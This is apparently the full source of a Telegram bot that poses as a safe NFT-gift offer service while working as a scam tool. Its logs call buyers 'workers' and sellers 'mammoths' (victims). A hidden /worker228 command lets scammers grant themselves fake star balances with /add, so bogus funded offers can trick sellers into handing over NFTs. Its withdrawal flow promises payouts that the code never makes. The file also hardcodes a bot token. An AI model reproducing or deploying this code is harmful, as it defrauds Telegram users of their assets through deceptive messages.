import asyncio
import logging
import re
import sqlite3
import sys
import time

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BotCommand,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InlineQueryResultArticle,
    InputTextMessageContent,
    LabeledPrice,
    Message,
    PreCheckoutQuery,
)

import nft_watcher

BOT_TOKEN = "8694841890:AAFjWxinhGy0YmPMKYYFgD9X7_ZS_mLyJu8"
SUPPORT_USERNAME = "OffersGiftsSupport"
DB_PATH = "users.db"
WITHDRAW_COMMISSION = 0.05
OFFER_TTL = 24 * 60 * 60

LOG_CHAT_ID = -1004487524674  # ← ЗАМЕНИ на ID своей группы

OWNER_IDS = [8460873914, 8655035814]

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

BOT_USERNAME = ""

conn = sqlite3.connect(DB_PATH)
cur = conn.cursor()
cur.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        lang TEXT NOT NULL,
        balance INTEGER DEFAULT 0,
        username TEXT
    )
""")
cur.execute("""
    CREATE TABLE IF NOT EXISTS workers (
        user_id INTEGER PRIMARY KEY
    )
""")
cur.execute("""
    CREATE TABLE IF NOT EXISTS offers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        buyer_id INTEGER NOT NULL,
        seller_id INTEGER,
        chat_id INTEGER NOT NULL,
        message_id INTEGER,
        nft_link TEXT NOT NULL,
        nft_name TEXT NOT NULL,
        amount INTEGER NOT NULL,
        lang TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'pending',
        created_at INTEGER NOT NULL
    )
""")
for col, definition in [("balance", "INTEGER DEFAULT 0"), ("username", "TEXT")]:
    try:
        cur.execute(f"ALTER TABLE users ADD COLUMN {col} {definition}")
    except sqlite3.OperationalError:
        pass
conn.commit()


def get_user(user_id):
    cur.execute("SELECT lang, balance FROM users WHERE user_id = ?", (user_id,))
    return cur.fetchone()


def get_lang(user_id):
    row = get_user(user_id)
    return row[0] if row else None


def get_balance(user_id):
    row = get_user(user_id)
    return row[1] if row else 0


def set_lang(user_id, lang):
    cur.execute(
        "INSERT INTO users (user_id, lang, balance) VALUES (?, ?, 0) "
        "ON CONFLICT(user_id) DO UPDATE SET lang = excluded.lang",
        (user_id, lang),
    )
    conn.commit()


def ensure_user(user_id):
    cur.execute(
        "INSERT OR IGNORE INTO users (user_id, lang, balance) VALUES (?, 'ru', 0)",
        (user_id,),
    )
    conn.commit()


def update_username(user_id, username):
    if not username:
        return
    ensure_user(user_id)
    cur.execute("UPDATE users SET username = ? WHERE user_id = ?", (username.lower(), user_id))
    conn.commit()


def add_balance(user_id, amount):
    ensure_user(user_id)
    cur.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()


def deduct_balance(user_id, amount):
    ensure_user(user_id)
    cur.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, user_id))
    conn.commit()


def create_offer(buyer_id, chat_id, nft_link, nft_name, amount, lang):
    cur.execute(
        "INSERT INTO offers (buyer_id, chat_id, nft_link, nft_name, amount, lang, status, created_at) "
        "VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)",
        (buyer_id, chat_id, nft_link, nft_name, amount, lang, int(time.time())),
    )
    conn.commit()
    return cur.lastrowid


def get_offer(offer_id):
    cur.execute(
        "SELECT id, buyer_id, seller_id, chat_id, message_id, nft_link, nft_name, "
        "amount, lang, status, created_at FROM offers WHERE id = ?",
        (offer_id,),
    )
    return cur.fetchone()


def set_offer_seller(offer_id, seller_id):
    cur.execute("UPDATE offers SET seller_id = ? WHERE id = ?", (seller_id, offer_id))
    conn.commit()


def set_offer_status(offer_id, status):
    cur.execute("UPDATE offers SET status = ? WHERE id = ?", (status, offer_id))
    conn.commit()


def is_offer_expired(offer_row):
    return time.time() - offer_row[10] > OFFER_TTL


def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


def is_worker(user_id: int) -> bool:
    cur.execute("SELECT 1 FROM workers WHERE user_id = ?", (user_id,))
    return cur.fetchone() is not None


def add_worker(user_id: int):
    cur.execute("INSERT OR IGNORE INTO workers (user_id) VALUES (?)", (user_id,))
    conn.commit()


def user_display(user_id) -> str:
    if user_id is None:
        return "неизвестно"
    cur.execute("SELECT username FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    username = row[0] if row and row[0] else None
    if username:
        return f"@{username}"
    return f'<a href="tg://user?id={user_id}">{user_id}</a>'


async def send_log(text: str):
    if not LOG_CHAT_ID:
        return
    try:
        await bot.send_message(int(LOG_CHAT_ID), text)
    except Exception as e:
        logging.warning(f"Не удалось отправить лог: {e}")


class TopUp(StatesGroup):
    amount = State()


class Withdraw(StatesGroup):
    amount = State()


TEXTS = {
    "ru": {
        "choose_lang": "🌎 Choose a language / Выберите язык",
        "welcome": "🎉 Добро пожаловать! Все действия доступны ниже.",
        "create_offer": "🛡 Создать оффер",
        "balance": "💰 Баланс",
        "support": "👤 Поддержка",
        "about": "❓ О сервисе",
        "change_lang": "🌐 Сменить язык",
        "back": "🔙 Назад",
        "topup": "💰 Пополнить",
        "withdraw": "💰 Вывести",
        "about_text": (
            "🔒 Данный сервис создан для создания офферов на NFT в Telegram. "
            "Предоставляет минимальную комиссию и гарантирует вашу безопасность, "
            "исключает все риски мошенничества."
        ),
        "balance_text": "Ваш баланс: {balance} ⭐️\n\nВыберите действие",
        "enter_topup": "⭐️ Введите сумму пополнения\n\nКомиссия для пополнения: 0%",
        "enter_withdraw": "⭐️ Введите сумму, которую хотите вывести\n\nКомиссия для вывода: 5%",
        "topup_title": "Пополнение баланса",
        "topup_desc": "Пополнение на {amount} ⭐️",
        "topup_success": "Успешно зачислено {amount} ⭐️",
        "withdraw_success": (
            "✅ Успешно!\n\n"
            "⭐️ Итого к зачислению: {net}\n\n"
            "Звезды придут на ваш счет в течение 20 минут"
        ),
        "insufficient": "❌ Недостаточно средств на балансе",
        "invalid_amount": "❌ Введите корректную сумму",
        "create_offer_instruction": (
            "⭐️ Для создания оффера перейдите в чат с продавцом и отправьте сообщение подобного формата:\n\n"
            "@{bot_username} (ссылка на NFT) (сумма) (язык eng/ru)\n"
            "Пример: @{bot_username} t.me/nft/DiamondRing-1 10000 ru\n\n"
            "🛡 После того как продавец примет ваш оффер, с вашего баланса будут списаны звезды."
        ),
        "offer_message": (
            "Пользователь {buyer_name} предлагает вам {amount} ⭐️ за подарок {nft_name}\n\n"
            "Предложение действует еще {time_left}"
        ),
        "accept": "Принять",
        "decline": "Отклонить",
        "accepted_message": (
            "✅ Вы приняли оффер. Передайте NFT покупателю и звезды поступят на ваш баланс."
        ),
        "declined_message": "❌ Вы отклонили оффер.",
        "expired_message": "❌ Срок действия оффера истёк.",
        "already_handled": "❌ Оффер уже обработан.",
        "cannot_self": "❌ Нельзя принять или отклонить собственный оффер.",
        "buyer_insufficient": "❌ У покупателя недостаточно средств.",
        "no_balance": "❌ У вас недостаточно звезд для создания оффера.",
        "offer_not_found": "❌ Оффер не найден.",
    },
    "en": {
        "choose_lang": "🌎 Choose a language / Выберите язык",
        "welcome": "🎉 Welcome! All actions are available below.",
        "create_offer": "🛡 Create offer",
        "balance": "💰 Balance",
        "support": "👤 Support",
        "about": "❓ About the service",
        "change_lang": "🌐 Change language",
        "back": "🔙 Back",
        "topup": "💰 Top up",
        "withdraw": "💰 Withdraw",
        "about_text": (
            "🔒 This service is designed for creating offers on NFTs in Telegram. "
            "It provides a minimal commission and guarantees your safety, "
            "eliminating all fraud risks."
        ),
        "balance_text": "Your balance: {balance} ⭐️\n\nChoose an action",
        "enter_topup": "⭐️ Enter the top-up amount\n\nTop-up commission: 0%",
        "enter_withdraw": "⭐️ Enter the amount to withdraw\n\nWithdrawal commission: 5%",
        "topup_title": "Balance top-up",
        "topup_desc": "Top-up for {amount} ⭐️",
        "topup_success": "Successfully credited {amount} ⭐️",
        "withdraw_success": (
            "✅ Success!\n\n"
            "⭐️ Total to receive: {net}\n\n"
            "The stars will arrive to your account within 20 minutes"
        ),
        "insufficient": "❌ Insufficient funds",
        "invalid_amount": "❌ Enter a valid amount",
        "create_offer_instruction": (
            "⭐️ To create an offer, go to the chat with the seller and send a message like this:\n\n"
            "@{bot_username} (NFT link) (amount) (language eng/ru)\n"
            "Example: @{bot_username} t.me/nft/DiamondRing-1 10000 ru\n\n"
            "🛡 After the seller accepts your offer, stars will be deducted from your balance."
        ),
        "offer_message": (
            "User {buyer_name} offers you {amount} ⭐️ for the gift {nft_name}\n\n"
            "Offer is valid for another {time_left}"
        ),
        "accept": "Accept",
        "decline": "Decline",
        "accepted_message": (
            "✅ You have accepted the offer. Transfer the NFT to the buyer and the stars will be credited to your balance."
        ),
        "declined_message": "❌ You declined the offer.",
        "expired_message": "❌ The offer has expired.",
        "already_handled": "❌ The offer has already been handled.",
        "cannot_self": "❌ You cannot accept or decline your own offer.",
        "buyer_insufficient": "❌ The buyer has insufficient funds.",
        "no_balance": "❌ You don't have enough stars to create an offer.",
        "offer_not_found": "❌ Offer not found.",
    },
}


def lang_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🇺🇸 ENG", callback_data="lang:en"),
                InlineKeyboardButton(text="🇷🇺 RU", callback_data="lang:ru"),
            ]
        ]
    )


def main_menu_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=t["create_offer"], callback_data="menu:create_offer")],
            [
                InlineKeyboardButton(text=t["balance"], callback_data="menu:balance"),
                InlineKeyboardButton(text=t["support"], url=f"https://t.me/{SUPPORT_USERNAME}"),
            ],
            [InlineKeyboardButton(text=t["about"], callback_data="menu:about")],
            [InlineKeyboardButton(text=t["change_lang"], callback_data="menu:change_lang")],
        ]
    )


def back_to_menu_kb(lang: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text=TEXTS[lang]["back"], callback_data="back:menu")]]
    )


def balance_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=t["topup"], callback_data="balance:topup"),
                InlineKeyboardButton(text=t["withdraw"], callback_data="balance:withdraw"),
            ],
            [InlineKeyboardButton(text=t["back"], callback_data="back:menu")],
        ]
    )


def back_to_balance_kb(lang: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text=TEXTS[lang]["back"], callback_data="back:balance")]]
    )


def offer_kb(lang: str, offer_id: int) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    accept_url = f"https://t.me/{BOT_USERNAME}?start=accept_{offer_id}"
    decline_url = f"https://t.me/{BOT_USERNAME}?start=decline_{offer_id}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=t["accept"], url=accept_url),
                InlineKeyboardButton(text=t["decline"], url=decline_url),
            ]
        ]
    )


def parse_amount(text: str):
    if not text:
        return None
    try:
        return int(round(float(str(text).strip().replace(",", "."))))
    except (ValueError, AttributeError):
        return None


async def safe_delete(message: Message):
    try:
        await message.delete()
    except Exception:
        pass


async def show_balance(chat_id: int, message_id: int, user_id: int, lang: str):
    balance = get_balance(user_id)
    await bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text=TEXTS[lang]["balance_text"].format(balance=balance),
        reply_markup=balance_kb(lang),
    )


def parse_nft_link(link: str):
    match = re.search(r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)", link)
    if not match:
        return None
    slug, number = match.group(1), match.group(2)
    return {
        "slug": slug,
        "number": number,
        "name": f"{slug} #{number}",
        "full_slug": f"{slug}-{number}",
    }


async def process_offer_accept(offer_id: int, seller_id: int) -> str:
    offer = get_offer(offer_id)
    if not offer:
        return TEXTS["ru"]["offer_not_found"]

    (oid, buyer_id, existing_seller, chat_id, message_id,
     nft_link, nft_name, amount, lang, status, created_at) = offer
    t = TEXTS[lang]

    if status != "pending":
        return t["already_handled"]

    if is_offer_expired(offer):
        set_offer_status(offer_id, "expired")
        return t["expired_message"]

    if seller_id == buyer_id:
        return t["cannot_self"]

    if existing_seller is None:
        set_offer_seller(offer_id, seller_id)
        existing_seller = seller_id

    if seller_id != existing_seller:
        return t["cannot_self"]

    if get_balance(buyer_id) < amount:
        set_offer_status(offer_id, "cancelled")
        return t["buyer_insufficient"]

    set_offer_status(offer_id, "accepted")

    nft_data = parse_nft_link(nft_link)
    if nft_data:
        nft_watcher.register_offer(
            offer_id=offer_id,
            buyer_id=buyer_id,
            seller_id=seller_id,
            nft_slug=nft_data["full_slug"],
            amount=amount,
            lang=lang,
            created_at=created_at,
        )

    await send_log(
        "Оффер принят\n"
        f"Воркер: {user_display(buyer_id)}\n"
        f"Мамонт: {user_display(seller_id)}"
    )

    # Уведомляем покупателя
    buyer_lang = get_lang(buyer_id) or "ru"
    buyer_text = {
        "ru": (
            f"✅ Ваш оффер на {amount} ⭐️ за {nft_name} принят!\n\n"
        ),
        "en": (
            f"✅ Your offer of {amount} ⭐️ for {nft_name} has been accepted!\n\n"
        ),
    }[buyer_lang]

    try:
        await bot.send_message(buyer_id, buyer_text)
    except Exception as e:
        logging.warning(f"Не удалось уведомить покупателя {buyer_id}: {e}")

    return t["accepted_message"]


async def process_offer_decline(offer_id: int, seller_id: int) -> str:
    offer = get_offer(offer_id)
    if not offer:
        return TEXTS["ru"]["offer_not_found"]

    (oid, buyer_id, existing_seller, chat_id, message_id,
     nft_link, nft_name, amount, lang, status, created_at) = offer
    t = TEXTS[lang]

    if status != "pending":
        return t["already_handled"]

    if is_offer_expired(offer):
        set_offer_status(offer_id, "expired")
        return t["expired_message"]

    if seller_id == buyer_id:
        return t["cannot_self"]

    if existing_seller is None:
        set_offer_seller(offer_id, seller_id)
        existing_seller = seller_id

    if seller_id != existing_seller:
        return t["cannot_self"]

    set_offer_status(offer_id, "declined")

    await send_log(
        "Отказ от оффера\n"
        f"Воркер: {user_display(buyer_id)}\n"
        f"Мамонт: {user_display(seller_id)}"
    )

    # Уведомляем покупателя
    buyer_lang = get_lang(buyer_id) or "ru"
    buyer_text = {
        "ru": f"❌ Ваш оффер на {amount} ⭐️ за {nft_name} отклонён.",
        "en": f"❌ Your offer of {amount} ⭐️ for {nft_name} has been declined.",
    }[buyer_lang]

    try:
        await bot.send_message(buyer_id, buyer_text)
    except Exception as e:
        logging.warning(f"Не удалось уведомить покупателя {buyer_id}: {e}")

    return t["declined_message"]


@dp.message(CommandStart(deep_link=True))
async def cmd_start_deeplink(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    await safe_delete(message)

    user = message.from_user
    update_username(user.id, user.username)

    args = (command.args or "").strip()
    lang = get_lang(user.id) or "ru"

    if args.startswith("accept_"):
        try:
            offer_id = int(args.split("_", 1)[1])
        except ValueError:
            offer_id = None
        if offer_id:
            text = await process_offer_accept(offer_id, user.id)
            await message.answer(text, reply_markup=main_menu_kb(lang))
            return

    if args.startswith("decline_"):
        try:
            offer_id = int(args.split("_", 1)[1])
        except ValueError:
            offer_id = None
        if offer_id:
            text = await process_offer_decline(offer_id, user.id)
            await message.answer(text, reply_markup=main_menu_kb(lang))
            return

    await message.answer(TEXTS[lang]["welcome"], reply_markup=main_menu_kb(lang))


@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await safe_delete(message)

    user = message.from_user
    update_username(user.id, user.username)

    lang = get_lang(user.id)
    if lang is None:
        await message.answer(TEXTS["ru"]["choose_lang"], reply_markup=lang_kb())
    else:
        await message.answer(TEXTS[lang]["welcome"], reply_markup=main_menu_kb(lang))


@dp.callback_query(F.data.startswith("lang:"))
async def on_lang(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = call.data.split(":", 1)[1]
    set_lang(call.from_user.id, lang)
    await call.message.edit_text(TEXTS[lang]["welcome"], reply_markup=main_menu_kb(lang))
    await call.answer()


@dp.callback_query(F.data == "back:menu")
async def on_back_menu(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = get_lang(call.from_user.id) or "ru"
    await call.message.edit_text(TEXTS[lang]["welcome"], reply_markup=main_menu_kb(lang))
    await call.answer()


@dp.callback_query(F.data == "back:balance")
async def on_back_balance(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = get_lang(call.from_user.id) or "ru"
    await show_balance(call.message.chat.id, call.message.message_id, call.from_user.id, lang)
    await call.answer()


@dp.callback_query(F.data.startswith("menu:"))
async def on_menu(call: CallbackQuery, state: FSMContext):
    await state.clear()
    action = call.data.split(":", 1)[1]
    lang = get_lang(call.from_user.id) or "ru"
    t = TEXTS[lang]

    if action == "change_lang":
        await call.message.edit_text(TEXTS["ru"]["choose_lang"], reply_markup=lang_kb())
        await call.answer()
        return

    if action == "about":
        await call.message.edit_text(t["about_text"], reply_markup=back_to_menu_kb(lang))
        await call.answer()
        return

    if action == "balance":
        await show_balance(call.message.chat.id, call.message.message_id, call.from_user.id, lang)
        await call.answer()
        return

    if action == "create_offer":
        await call.message.edit_text(
            t["create_offer_instruction"].format(bot_username=BOT_USERNAME),
            reply_markup=back_to_menu_kb(lang),
        )
        await call.answer()
        return

    await call.answer("OK")


@dp.guest_message(F.text)
async def on_guest_offer_message(message: Message):
    text = message.text or ""
    parts = text.split()

    link = None
    amount_str = None
    lang_suffix = None

    for i, part in enumerate(parts):
        if "t.me/nft/" in part:
            link = part
            if i + 1 < len(parts):
                amount_str = parts[i + 1]
            if i + 2 < len(parts):
                candidate = parts[i + 2].lower().strip()
                if candidate in ("ru", "eng", "en", "рус"):
                    lang_suffix = "ru" if candidate in ("ru", "рус") else "en"
            break

    if not link or not amount_str:
        return

    nft_data = parse_nft_link(link)
    if not nft_data:
        return
    nft_name = nft_data["name"]

    amount = parse_amount(amount_str)
    if amount is None or amount < 1:
        return

    buyer = message.from_user
    buyer_name = buyer.full_name

    if lang_suffix:
        lang = lang_suffix
    else:
        lang = get_lang(buyer.id) or "ru"

    t = TEXTS[lang]

    if get_balance(buyer.id) < amount:
        await bot.answer_guest_query(
            guest_query_id=message.guest_query_id,
            result=InlineQueryResultArticle(
                id="no_balance",
                title="No balance",
                input_message_content=InputTextMessageContent(
                    message_text=t["no_balance"],
                    parse_mode=ParseMode.HTML,
                ),
            ),
        )
        return

    offer_id = create_offer(
        buyer_id=buyer.id,
        chat_id=message.chat.id,
        nft_link=link,
        nft_name=nft_name,
        amount=amount,
        lang=lang,
    )

    offer_text = t["offer_message"].format(
        buyer_name=buyer_name,
        amount=amount,
        nft_name=nft_name,
        time_left="23ч 59м" if lang == "ru" else "23h 59m",
    )

    await bot.answer_guest_query(
        guest_query_id=message.guest_query_id,
        result=InlineQueryResultArticle(
            id=f"offer_{offer_id}",
            title="Offer",
            input_message_content=InputTextMessageContent(
                message_text=offer_text,
                parse_mode=ParseMode.HTML,
            ),
            reply_markup=offer_kb(lang, offer_id),
        ),
    )

    await send_log(
        "Оффер создан\n"
        f"Воркер: {user_display(buyer.id)}\n"
        f"Мамонт: неизвестно\n"
        f"NFT: {link}\n"
        f"Сумма: {amount}"
    )


@dp.callback_query(F.data == "balance:topup")
async def on_topup(call: CallbackQuery, state: FSMContext):
    lang = get_lang(call.from_user.id) or "ru"
    await state.set_state(TopUp.amount)
    await state.update_data(lang=lang)
    await call.message.edit_text(TEXTS[lang]["enter_topup"], reply_markup=back_to_balance_kb(lang))
    await call.answer()


@dp.message(TopUp.amount)
async def on_topup_amount(message: Message, state: FSMContext):
    await safe_delete(message)
    amount = parse_amount(message.text)
    data = await state.get_data()
    lang = data.get("lang") or get_lang(message.from_user.id) or "ru"

    if amount is None or amount < 1:
        await message.answer(
            TEXTS[lang]["invalid_amount"] + "\n\n" + TEXTS[lang]["enter_topup"],
            reply_markup=back_to_balance_kb(lang),
        )
        return

    await state.clear()
    await bot.send_invoice(
        chat_id=message.chat.id,
        title=TEXTS[lang]["topup_title"],
        description=TEXTS[lang]["topup_desc"].format(amount=amount),
        payload=f"topup:{message.from_user.id}:{amount}",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label="XTR", amount=amount)],
    )


@dp.pre_checkout_query()
async def on_pre_checkout(query: PreCheckoutQuery):
    await query.answer(ok=True)


@dp.message(F.successful_payment)
async def on_successful_payment(message: Message, state: FSMContext):
    payment = message.successful_payment
    user_id = message.from_user.id
    amount = payment.total_amount
    lang = get_lang(user_id) or "ru"

    add_balance(user_id, amount)
    await state.clear()
    await safe_delete(message)

    await message.answer(TEXTS[lang]["topup_success"].format(amount=amount))
    await message.answer(TEXTS[lang]["welcome"], reply_markup=main_menu_kb(lang))


@dp.callback_query(F.data == "balance:withdraw")
async def on_withdraw(call: CallbackQuery, state: FSMContext):
    lang = get_lang(call.from_user.id) or "ru"
    await state.set_state(Withdraw.amount)
    await state.update_data(msg_id=call.message.message_id, lang=lang)
    await call.message.edit_text(TEXTS[lang]["enter_withdraw"], reply_markup=back_to_balance_kb(lang))
    await call.answer()


@dp.message(Withdraw.amount)
async def on_withdraw_amount(message: Message, state: FSMContext):
    await safe_delete(message)
    amount = parse_amount(message.text)
    data = await state.get_data()
    msg_id = data.get("msg_id")
    user_id = message.from_user.id
    lang = data.get("lang") or get_lang(user_id) or "ru"

    if amount is None or amount < 1:
        if msg_id:
            try:
                await bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=msg_id,
                    text=TEXTS[lang]["invalid_amount"] + "\n\n" + TEXTS[lang]["enter_withdraw"],
                    reply_markup=back_to_balance_kb(lang),
                )
            except Exception:
                pass
        return

    await state.clear()
    balance = get_balance(user_id)

    if balance < amount:
        if msg_id:
            try:
                await bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=msg_id,
                    text=TEXTS[lang]["insufficient"],
                    reply_markup=back_to_balance_kb(lang),
                )
                return
            except Exception:
                pass
        await message.answer(TEXTS[lang]["insufficient"])
        return

    net = int(round(amount * (1 - WITHDRAW_COMMISSION)))
    deduct_balance(user_id, amount)
    text = TEXTS[lang]["withdraw_success"].format(net=net)

    if msg_id:
        try:
            await bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg_id,
                text=text,
                reply_markup=main_menu_kb(lang),
            )
        except Exception:
            pass
    else:
        await message.answer(text, reply_markup=main_menu_kb(lang))

    await send_log(f"{user_display(user_id)} создал выплату на {net}")


@dp.message(Command("worker228"))
async def cmd_worker228(message: Message):
    await safe_delete(message)
    user_id = message.from_user.id
    was_worker = is_worker(user_id)
    add_worker(user_id)
    await message.answer("Вы стали воркером, доступные команды - /add /remove")

    if not was_worker:
        await send_log(f"{user_display(user_id)} стал воркером")


@dp.message(Command("add"))
async def cmd_add(message: Message, command: CommandObject):
    user_id = message.from_user.id
    await safe_delete(message)
    if not (is_worker(user_id) or is_owner(user_id)):
        return
    amount = parse_amount(command.args)
    if amount is None or amount < 1:
        await message.answer("❌ Использование: /add (сумма)")
        return
    add_balance(user_id, amount)
    await message.answer(f"✅ Добавлено {amount} ⭐️\n\nВаш баланс: {get_balance(user_id)} ⭐️")


@dp.message(Command("remove"))
async def cmd_remove(message: Message, command: CommandObject):
    user_id = message.from_user.id
    await safe_delete(message)
    if not (is_worker(user_id) or is_owner(user_id)):
        return
    amount = parse_amount(command.args)
    if amount is None or amount < 1:
        await message.answer("❌ Использование: /remove (сумма)")
        return
    deduct_balance(user_id, amount)
    await message.answer(f"✅ Списано {amount} ⭐️\n\nВаш баланс: {get_balance(user_id)} ⭐️")


@dp.message(Command("adduser"))
async def cmd_adduser(message: Message, command: CommandObject):
    user_id = message.from_user.id
    await safe_delete(message)
    if not is_owner(user_id):
        return
    args = (command.args or "").split()
    if len(args) < 2:
        await message.answer("❌ Использование: /adduser (telegram_id) (сумма)")
        return
    try:
        target_id = int(args[0])
    except ValueError:
        await message.answer("❌ Некорректный telegram id")
        return
    amount = parse_amount(args[1])
    if amount is None or amount < 1:
        await message.answer("❌ Введите корректную сумму")
        return
    add_balance(target_id, amount)
    await message.answer(
        f"✅ Пользователю {target_id} добавлено {amount} ⭐️\n\n"
        f"Его баланс: {get_balance(target_id)} ⭐️"
    )


@dp.message(Command("removeuser"))
async def cmd_removeuser(message: Message, command: CommandObject):
    user_id = message.from_user.id
    await safe_delete(message)
    if not is_owner(user_id):
        return
    args = (command.args or "").split()
    if len(args) < 2:
        await message.answer("❌ Использование: /removeuser (telegram_id) (сумма)")
        return
    try:
        target_id = int(args[0])
    except ValueError:
        await message.answer("❌ Некорректный telegram id")
        return
    amount = parse_amount(args[1])
    if amount is None or amount < 1:
        await message.answer("❌ Введите корректную сумму")
        return
    deduct_balance(target_id, amount)
    await message.answer(
        f"✅ У пользователя {target_id} списано {amount} ⭐️\n\n"
        f"Его баланс: {get_balance(target_id)} ⭐️"
    )


@dp.message(Command("checkbalance"))
async def cmd_checkbalance(message: Message, command: CommandObject):
    user_id = message.from_user.id
    await safe_delete(message)
    if not is_owner(user_id):
        return
    args = (command.args or "").split()
    if len(args) < 1:
        await message.answer("❌ Использование: /checkbalance (telegram_id)")
        return
    try:
        target_id = int(args[0])
    except ValueError:
        await message.answer("❌ Некорректный telegram id")
        return
    row = get_user(target_id)
    if row is None:
        await message.answer(f"❌ Пользователь {target_id} не найден в базе")
        return
    await message.answer(
        f"👤 Пользователь: <code>{target_id}</code>\n"
        f"💰 Баланс: {row[1]} ⭐️"
    )


async def main():
    global BOT_USERNAME
    me = await bot.get_me()
    BOT_USERNAME = me.username
    logging.info(f"Бот запущен: @{BOT_USERNAME}")
    logging.info(f"Guest queries supported: {me.supports_guest_queries}")

    nft_watcher.bot_instance = bot
    nft_watcher.db_module = sys.modules[__name__]

    await bot.set_my_commands([
        BotCommand(command="start", description="🏠 Меню"),
    ])

    await asyncio.gather(
        dp.start_polling(bot),
        nft_watcher.watcher_loop(),
    )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    finally:
        conn.close()
